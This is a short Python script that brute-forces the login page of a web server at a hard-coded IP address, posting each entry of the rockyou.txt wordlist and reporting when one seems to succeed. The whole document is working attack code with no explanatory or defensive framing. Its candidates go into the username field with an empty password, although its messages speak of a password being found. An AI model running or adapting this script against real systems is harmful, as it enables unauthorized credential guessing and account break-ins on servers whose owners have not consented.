
import requests
from bs4 import BeautifulSoup as bs
import sys
from colorama import Fore
passwords = open("/home/rbus/bioh/rockyou.txt","r").read()
passwords = passwords.split('\n')
for i in passwords:
    session = requests.session()
    url = 'http://85.159.212.181/login-panel.php'
    page = session.get(url)
    form_data = {
	'username':i,
	'password':""
        }
    r = session.post(url,data=form_data)
    
    if 'Usuario' not in r.text:
        print (Fore.GREEN + "[+] PASSWORD HAS BEEN FOUND [+]")
        print (Fore.GREEN + "[+] PASSWORD -> " + i + " [+]")
        sys.exit()
    else:
        print (Fore.RED + "[-] STILL LOOKING FOR PASSWORD [-]" + " AREADY TRIED -> -> -> -> " + i)
        

